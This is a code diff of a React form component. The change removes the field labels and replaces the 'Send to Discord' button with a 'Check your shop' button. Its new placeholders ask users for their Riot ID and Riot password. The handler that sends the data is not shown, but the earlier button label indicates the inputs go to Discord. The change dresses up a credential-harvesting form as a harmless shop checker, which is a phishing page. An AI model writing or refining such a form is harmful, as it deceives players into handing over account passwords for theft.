@@ -1,14 +1,11 @@
-// FormComponent.js
 import { useState } from 'react';
 
 export default function FormComponent() {
   const [text1, setText1] = useState('');
   const [text2, setText2] = useState('');
-  const [isClicked, setIsClicked] = useState(false);
   const [loading, setLoading] = useState(false);
 
   const handleButtonClick = async () => {
-    setIsClicked(true);
     setLoading(true);
 
     try {
@@ -37,35 +34,27 @@ export default function FormComponent() {
 
   return (
     <div>
+      {/* No labels, only placeholders */}
       <div>
-        <label htmlFor="text1">Text Box 1:</label>
         <input
           type="text"
-          id="text1"
           value={text1}
           onChange={(e) => setText1(e.target.value)}
+          placeholder="Enter your Riot ID here."
         />
       </div>
       <div>
-        <label htmlFor="text2">Text Box 2:</label>
         <input
           type="text"
-          id="text2"
           value={text2}
           onChange={(e) => setText2(e.target.value)}
+          placeholder="Enter your Riot password here."
         />
       </div>
       <div>
         <button onClick={handleButtonClick} disabled={loading}>
-          {loading ? 'Sending...' : 'Send to Discord'}
+          {loading ? 'Checking...' : 'Check your shop'}
         </button>
-        {isClicked && !loading && (
-          <div>
-            <p>You clicked the button!</p>
-            <p>Text 1: {text1}</p>
-            <p>Text 2: {text2}</p>
-          </div>
-        )}
       </div>
     </div>
   );
